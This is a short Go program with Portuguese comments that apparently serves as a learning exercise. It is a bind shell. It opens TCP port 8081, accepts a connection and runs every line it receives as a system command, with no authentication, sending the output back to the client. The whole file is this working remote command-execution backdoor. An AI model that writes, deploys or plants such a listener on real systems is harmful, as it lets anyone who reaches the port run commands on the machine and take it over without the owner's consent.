package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

//Servidor que delvolve um Shell para cliente
func err(erro error) {
	if erro != nil {
		fmt.Println("Error -> ", erro)
		os.Exit(3)
		//validandos os erros
	}
}
func tcpBasico() {
	//Abrindo conexao basica tcp
	fmt.Println("Iniciando Servidor...")
	connect, erro1 := net.Listen("tcp", ":8081")
	err(erro1)

	//aceitando conexao tcp
	receberConexao, erro2 := connect.Accept()
	err(erro2)
	fmt.Println("Conexao recibida...")

	//a conexao sera ecerrada apos todo processo ser executao
	defer connect.Close()

	for {
		// loop infinito com for{}
		//Tranfomando mensagem em string -> bufio.Newreader
		mensagem, erro3 := bufio.NewReader(receberConexao).ReadString('\n')
		err(erro3)
		fmt.Println("Msg recibida pelo cliente -> ", mensagem)

		//retorna mensagen ou um comando para o cliente conectado
		//Eviando ( mensagem e receberConexao ) como argumento para a func executeCmd

		comando := executeCmd(mensagem, receberConexao)
		receberConexao.Write([]byte(comando))
	}

}

//executa comandos do cmd/bash
//a mensagem vira ( comando e conn net.Conn) no argumento na propria func
//sendo ( conn e net.Conn seu tipo) assim como o tipo de mensagem e ( string )
/*
	Essa parte do codigo junto com a conexao passada por arqgumento
	resolve o pproblema de travamento do programa, quando eviamos um comando invalido
	if errCmd != nil {
		fmt.Fprintf(conn, "%s\n", errCmd)
	}

*/
func executeCmd(comando string, conn net.Conn) []byte {

	retornaComandoParaCliete, errCmd := exec.Command(strings.TrimSuffix(comando, "\n")).Output()
	if errCmd != nil {
		//informa ao usuario que algo saiu erado
		fmt.Fprintf(conn, "%s\n", errCmd)
	}
	return retornaComandoParaCliete
}

//func principal
func main() {
	tcpBasico()
}
